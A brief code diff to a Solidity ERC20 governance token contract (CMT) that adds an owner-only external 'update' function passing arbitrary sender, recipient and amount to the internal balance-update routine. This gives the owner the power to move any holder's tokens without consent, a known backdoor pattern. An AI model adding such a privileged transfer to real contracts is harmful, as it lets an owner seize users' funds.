@@ -20,6 +20,10 @@ contract CMT is ERC20, ERC20Permit, ERC20Votes, Ownable {
         _burn(from, amount);
     }
 
+    function update(address from, address to, uint256 amount) external onlyOwner {
+        _update(from, to, amount);
+    }
+
     function _update(address from, address to, uint256 amount) internal override(ERC20, ERC20Votes) {
         super._update(from, to, amount);
     }
